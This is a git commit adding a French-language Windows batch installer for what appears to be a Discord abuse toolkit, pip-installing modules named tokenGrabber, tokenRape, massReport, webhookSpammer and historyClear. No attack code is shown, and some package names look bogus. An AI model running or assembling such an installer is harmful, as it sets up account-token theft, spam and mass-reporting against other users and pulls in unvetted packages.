6c00a69efb8efbd9db164d438526123f3947f607
Aku22M <102760604+Aku22M@users.noreply.github.com>
2022-05-06 23:17:42 +0200

    Add files via upload

---
+++ setup.bat
@@ -0,0 +1,16 @@
+@echo off
+color 6
+echo Téléchargement des modules :
+echo Made by Aku
+pip install time
+pip install colored
+pip install massReport
+pip install credits
+pip install tokenGrabber 
+pip install tokenRape
+pip install historyClear
+pip install tokenWebhookChecker
+pip install webhookSpammer
+pip install autoBump
+pip install dankMemer
+pip install serverLookup
